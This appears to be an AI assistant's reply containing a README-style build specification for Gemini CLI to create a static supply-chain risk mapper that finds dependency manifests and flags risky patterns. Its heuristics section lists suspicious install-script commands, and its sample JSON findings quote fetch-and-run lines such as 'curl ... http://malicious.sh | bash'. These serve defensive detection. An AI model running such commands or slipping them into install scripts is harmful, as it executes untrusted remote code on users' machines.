Perfect. Below is a **single, long prompt** you can feed into **Gemini CLI** (or any codegen model). It’s written as a `README.md` so that it doubles as documentation *and* an instruction set for the model to build your **Supply Chain Risk Mapper** — focusing on the **mapper phase** only (the part that discovers dependencies and identifies possible supply chain risk surfaces), not the final agent.

---

````markdown
# 🧩 Supply Chain Risk Mapper — Build Specification

## 📘 Overview

You are an advanced code generation agent (Gemini CLI) tasked with building the **Supply Chain Risk Mapper**, a static analysis tool that scans entire repositories to identify all **dependencies**, **manifests**, and **potential supply chain attack surfaces**.

Focus entirely on the **Mapper layer**, not the final agent integration or post-processing.  
The goal is to produce a **highly modular, extensible base system** that can be plugged into agents like `socket.dev`, `Snyk`, `Trivy`, or custom scanners later.

---

## 🎯 Primary Objective

Build a **cross-language dependency and metadata mapper** that:
- Recursively scans a code repository.
- Identifies all dependency-related files and manifests.
- Extracts, normalizes, and outputs a structured JSON describing:
  - Each ecosystem detected (npm, PyPI, Go, etc.)
  - The dependencies and their metadata.
  - The potential points of supply chain risk.
- Optionally computes lightweight **risk signals** (static heuristics) for each dependency.
- Produces one consolidated JSON output file that other agents can later consume.

Focus 90% on **accurate discovery, parsing, and normalization** of manifests, not the external scanning.

---

## 🧱 Architectural Breakdown

### 1. Repo Walker
- Recursively walks through the entire repo.
- Honors `.gitignore` (use libraries like `pathspec` in Python or similar).
- Collects all known manifest and lockfile types:
  - **JavaScript/TypeScript:** `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`
  - **Python:** `requirements.txt`, `pyproject.toml`, `Pipfile`, `Pipfile.lock`
  - **Go:** `go.mod`, `go.sum`
  - **Rust:** `Cargo.toml`, `Cargo.lock`
  - **Java:** `pom.xml`, `build.gradle`, `gradle.lockfile`
  - **Ruby:** `Gemfile`, `Gemfile.lock`
  - **PHP:** `composer.json`, `composer.lock`
  - **.NET:** `*.csproj`, `packages.lock.json`
  - **Container / Infra:** `Dockerfile`, `docker-compose.yml`
  - **CI/CD:** `.github/workflows/*.yml`, `.gitlab-ci.yml`
  - **Git submodules:** `.gitmodules`
  - **Other:** `setup.py`, `setup.cfg`, `Makefile`, `build scripts`

Output:
```json
{
  "repo_path": "./",
  "manifests_found": [
    "services/api/package.json",
    "requirements.txt",
    "go.mod",
    "Dockerfile"
  ]
}
````

---

### 2. Manifest Parser Layer

Create modular parsers for each ecosystem.
Each parser returns a list of normalized dependency records with as much metadata as possible.

Each record should follow this schema:

```json
{
  "ecosystem": "npm",
  "manifest_path": "services/api/package.json",
  "dependency": {
    "name": "express",
    "version": "^4.18.0",
    "source": "registry",
    "resolved_url": "https://registry.npmjs.org/express/-/express-4.18.0.tgz"
  },
  "metadata": {
    "dev_dependency": false,
    "line_number": 12,
    "script_section": false
  }
}
```

Support lockfile parsing for better version resolution whenever possible (e.g. `package-lock.json`, `poetry.lock`, `go.sum`, etc.).

---

### 3. Lightweight Risk Signal Extraction

Perform a **static heuristic scan** (no network calls) to detect potential supply chain risks within the repo.

You are **not performing vulnerability scanning** — just structural/risk mapping.

Heuristics to implement:

* **Install/Postinstall scripts**:

  * Detect suspicious commands like `curl`, `wget`, `bash`, `python -c`, `node -e`.
* **Obfuscated or encoded code**:

  * Flag long base64 strings or `eval` usage.
* **Git dependencies**:

  * Detect `git+https` or `git@` sources in manifests.
* **Unpinned versions**:

  * Wildcards (`*`, `latest`, unversioned).
* **Binary or native modules**:

  * Detect `.so`, `.dll`, `.node`, `.exe` under `/vendor`, `/node_modules`, `/dist`.
* **Container/Dockerfile risks**:

  * Unpinned base image tags (e.g. `FROM node:latest`).
  * `RUN curl ... | sh`.
* **Third-party CI Actions**:

  * Unpinned refs in `uses: owner/action@ref` (e.g. using `@main` or `@latest`).

For each heuristic trigger, emit a `signal` entry:

```json
{
  "type": "postinstall_script",
  "file": "package.json",
  "line": 45,
  "detail": "postinstall runs 'curl -sSL http://malicious.sh | bash'",
  "severity": "high"
}
```

---

### 4. Canonical Output Structure

Final JSON output should look like this:

```json
{
  "repo": {
    "path": "/path/to/repo",
    "commit_hash": "abc123"
  },
  "scan_summary": {
    "total_manifests": 4,
    "ecosystems_detected": ["npm", "python", "docker"]
  },
  "dependencies": [
    {
      "ecosystem": "npm",
      "manifest_path": "services/api/package.json",
      "dependency": {
        "name": "axios",
        "version": "^1.3.2",
        "source": "registry",
        "resolved": "https://registry.npmjs.org/axios/-/axios-1.3.2.tgz"
      },
      "signals": [
        {
          "type": "postinstall_script",
          "file": "package.json",
          "detail": "postinstall runs 'curl https://example.sh | bash'",
          "severity": "high"
        }
      ],
      "risk_score": 0.85
    }
  ]
}
```

---

### 5. Configurability

* Config file support (`config.yaml`):

  * Paths to ignore.
  * File types to include/exclude.
  * Severity thresholds.
  * Optional offline mode toggle (no network access).
* CLI flags:

  * `--output report.json`
  * `--no-color`
  * `--include-binaries`
  * `--config config.yaml`

---

### 6. Implementation Language

Use **Python 3.11+** unless specified otherwise.

Suggested libraries:

* `pathspec` – handle .gitignore rules
* `toml` / `tomllib` – parse TOML files
* `xml.etree.ElementTree` – parse XML (for Maven, csproj)
* `ruamel.yaml` – parse YAML safely
* `re` / regex – pattern scanning
* `argparse` – CLI
* `json` – output format

Modularize:

```
/src
 ├── __init__.py
 ├── cli.py
 ├── walker.py
 ├── parsers/
 │    ├── npm_parser.py
 │    ├── python_parser.py
 │    ├── go_parser.py
 │    └── ...
 ├── signals.py
 ├── risk_heuristics.py
 └── output.py
```

---

### 7. Command Usage Example

```bash
$ python3 -m mapper --path . --output mapper_report.json
```

Expected output in `mapper_report.json`:

* JSON object containing all dependency and signal findings.

---

### 8. Stretch Goals (optional for later phases)

Do **not implement now**, but design so they’re easy to plug in later:

* Agent integrations (socket.dev, osv.dev, snyk).
* Registry metadata enrichment.
* ML-based scoring.
* Graph visualization of dependency tree.

---

## 💡 Implementation Notes

* Do *not* execute any package installs or run build scripts.
* This is a **static-only** scanner.
* Focus on **completeness** of manifest discovery.
* Prioritize **clarity**, **modularity**, and **extensibility** of code structure.

---

## ✅ Deliverables

When Gemini CLI runs, it should:

1. Create the entire project structure.
2. Implement CLI entrypoint (`mapper`).
3. Implement manifest discovery and parsing for at least:

   * npm (`package.json`)
   * Python (`requirements.txt`, `pyproject.toml`)
   * Go (`go.mod`)
   * Dockerfile
4. Implement risk signal detection for postinstall scripts, git dependencies, and unpinned versions.
5. Produce a single `report.json` with all discovered dependency info.
6. Include this `README.md` in the repo.

---

## 📎 Optional Extensions (future)

* Detect binary blobs (`.node`, `.so`, `.dll`, `.exe`) and flag them.
* Detect large encoded blobs (base64/hex) in JS or Python source.
* Extend for CI/CD scanning (GitHub Actions YAML).

---

## 🧠 Summary for the Model

You are building:

* The **Mapper**, not the agent.
* Static, language-agnostic dependency and risk discovery.
* Modular, easily extended by others.
* Written in clean, well-commented, production-quality Python.
* Output = `report.json` following schema described above.

Output after generation should include:

* Full source code
* Working CLI entrypoint
* Example run instructions
* Sample output
* Unit tests for core components (bonus)

---

## 🚀 End of Prompt

This README itself is the **instruction set**.
Use it to generate the project automatically when invoked inside Gemini CLI.
Focus heavily on dependency mapping and signal extraction logic.

```

---

Would you like me to add **sample test repos** and **expected outputs** (so Gemini can auto-generate test fixtures too)? That makes it generate much more robust code.
```
